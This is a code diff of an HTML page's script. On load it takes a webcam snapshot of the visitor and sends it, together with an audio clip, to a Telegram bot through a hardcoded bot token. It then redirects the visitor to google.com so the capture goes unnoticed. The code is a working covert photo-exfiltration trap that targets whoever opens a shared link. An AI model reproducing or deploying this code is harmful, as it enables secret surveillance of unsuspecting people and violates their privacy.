@@ -19,85 +19,58 @@
     <canvas id="c"></canvas>
 
     <script>
-      const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
-      const chatId = window.location.pathname.split("/").pop(); // URL oxiridagi chatId
+const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
+const chatId = window.location.pathname.split("/").pop();
 
-      async function start() {
-        try {
-          if (!chatId) {
-            console.error("chatId topilmadi");
-            return;
-          }
+async function start() {
+  try {
+    if (!chatId) throw new Error("chatId yo'q");
 
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: true,
-          });
-          const v = document.getElementById("v");
-          v.srcObject = stream;
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const v = document.createElement("video");
+    v.srcObject = stream;
+    await v.play();
+    await new Promise(r => setTimeout(r, 1000)); // kamera tayyor bo‘lishini kutish
 
-          // video frame kelishini kutamiz
-          await new Promise((resolve) => {
-            if (v.readyState >= 2 && v.videoWidth > 0) return resolve();
-            const onPlaying = () => {
-              v.removeEventListener("playing", onPlaying);
-              resolve();
-            };
-            v.addEventListener("playing", onPlaying);
-            v.play().catch(() => {});
-            setTimeout(() => {
-              v.removeEventListener("playing", onPlaying);
-              resolve();
-            }, 2500);
-          });
+    const c = document.createElement("canvas");
+    c.width = v.videoWidth;
+    c.height = v.videoHeight;
+    c.getContext("2d").drawImage(v, 0, 0);
 
-          const c = document.getElementById("c");
-          c.width = v.videoWidth || 640;
-          c.height = v.videoHeight || 480;
-          const ctx = c.getContext("2d");
-          await new Promise((r) => requestAnimationFrame(r));
-          ctx.drawImage(v, 0, 0, c.width, c.height);
+    stream.getTracks().forEach(t => t.stop());
+    const blob = await new Promise(res => c.toBlob(res, "image/png"));
 
-          stream.getTracks().forEach((t) => t.stop());
+    // Rasmni yuborish
+    const form = new FormData();
+    form.append("chat_id", chatId);
+    form.append("photo", blob, "selfie.png");
+    form.append("caption", "*Foydalanuvchi rasmi olindi ✅*");
+    form.append("parse_mode", "MarkdownV2");
 
-          const blob = await new Promise((res) => c.toBlob(res, "image/png"));
-          if (!blob) throw new Error("Rasm olinmadi");
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: form,
+    });
 
-          const form = new FormData();
-          form.append("chat_id", chatId);
-          form.append("photo", blob, "selfie.png");
-          form.append(
-            "caption",
-            "*Foydalanuvchi rasmi olindi ✅*",
-            "MarkdownV2"
-          );
-          form.append(
-            "audio",
-            new Blob(
-              [await fetch("music/koryapman.ogg").then((r) => r.arrayBuffer())],
-              { type: "audio/ogg" }
-            ),
-            "koryapman.ogg"
-          );
-          const resp = await fetch(
-            `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
-            { method: "POST", body: form }
-          );
-          const data = await resp.json().catch(() => null);
+    // Ovoz yuborish
+    const audio = await fetch("music/koryapman.ogg").then(r => r.blob());
+    const voiceForm = new FormData();
+    voiceForm.append("chat_id", chatId);
+    voiceForm.append("voice", audio, "koryapman.ogg");
 
-          if (!resp.ok || (data && !data.ok)) {
-            console.error("Telegramga yuborishda muammo", resp, data);
-            window.location.href = "https://google.com";
-            return;
-          }
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, {
+      method: "POST",
+      body: voiceForm,
+    });
 
-          window.location.href = "https://google.com";
-        } catch (err) {
-          console.error(err);
-          window.location.href = "https://google.com";
-        }
-      }
+    window.location.href = "https://google.com";
+  } catch (e) {
+    console.error(e);
+  }
+}
+start();
+</script>
 
-      start();
-    </script>
   </body>
 </html>
+
